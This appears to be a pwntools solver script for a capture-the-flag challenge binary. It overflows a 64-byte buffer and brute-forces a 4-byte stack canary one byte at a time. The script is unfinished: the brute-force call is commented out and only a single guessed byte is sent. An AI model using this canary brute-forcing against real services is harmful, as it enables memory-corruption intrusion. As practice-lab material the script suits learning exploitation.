from pwn import (
    args,
    gdb,
    remote,
    process,
    cyclic,
    p32,
    u32,
    flat,
    ELF,
    context,
    log,
    sys,
    warnings,
)


def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


def brute_canary():
    needle = b"Ok... Now Where's the Flag?"
    canary = b""
    while len(canary) != 4:
        for i in range(256):
            r = start()
            temp = cyclic(offset_buf) + canary + bytes([i])
            r.sendlineafter(b"> ", str(len(temp)).encode())
            r.sendlineafter(b"> ", temp)
            if r.can_recv():
                if r.recvline().strip() in needle:
                    print(f"Found canary: {canary}")
                    canary += bytes([i])
                    break
            r.close()

    return canary


warnings.filterwarnings("ignore")
gdbscript = """
init-pwndbg
continue
""".format(**locals())

exe = "./vuln"
elf = context.binary = ELF(exe, checksec=False)
context.log_level = "debug"
context.terminal = "kitty"

offset_buf = 64
# real_canary = brute_canary()
# print(real_canary)
io = start()

temp = cyclic(offset_buf) + b"" + bytes([ord("t")])

io.sendlineafter(b"> ", str(len(temp)).encode())
io.sendlineafter(b"> ", temp)
if io.can_recv():
    print(io.recvline().strip() in b"Ok... Now Where's the Flag?")

io.interactive()
